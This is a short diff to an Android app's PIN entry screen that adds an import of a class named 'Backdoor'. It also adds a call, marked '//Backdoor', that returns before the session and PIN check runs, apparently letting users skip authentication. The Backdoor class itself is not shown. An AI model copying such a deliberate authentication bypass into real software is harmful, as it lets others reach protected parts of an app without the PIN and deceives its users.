@@ -7,6 +7,7 @@ import android.support.v7.widget.Toolbar;
 import android.view.View;
 import android.widget.Toast;
 
+import com.example.happypig.myapplication.Utilities.Backdoor;
 import com.example.happypig.myapplication.Utilities.Session;
 
 public class PINActivity extends AppCompatActivity {
@@ -23,6 +24,10 @@ public class PINActivity extends AppCompatActivity {
 
     public  void  enterPinClick (View v)
     {
+        //Backdoor
+        if(Backdoor.toPigstyActivity(this))
+            return;
+
         Session session = new Session(getApplicationContext());
         String pin = "";
 
